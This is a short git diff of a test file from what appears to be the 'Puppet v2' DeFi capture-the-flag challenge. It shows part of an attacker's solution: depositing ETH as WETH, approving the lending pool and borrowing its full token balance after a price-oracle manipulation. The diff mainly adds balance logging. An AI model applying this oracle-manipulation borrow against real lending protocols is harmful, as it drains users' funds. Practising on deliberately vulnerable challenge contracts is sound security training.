@@ -96,18 +96,15 @@ describe('[Challenge] Puppet v2', function () {
             10 ** 10
         )
         const wethRequired = await attPuppet.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
-        console.log(`Weth required ${wethRequired}`);
+        console.log(`Weth required ${ethers.utils.formatEther(wethRequired)}`);
+        const wethInAcc = await attWeth.balanceOf(attacker.address)
+        console.log(`Weth with my account: ${ethers.utils.formatEther(wethInAcc)}`);
+
         await attWeth.deposit({value: ethers.utils.parseEther("19.8")})
         
         await attWeth.approve(attPuppet.address, wethRequired);
 
         await attPuppet.borrow(POOL_INITIAL_TOKEN_BALANCE);
-
-
-
-
-
-
 
         /** CODE YOUR EXPLOIT HERE */
         
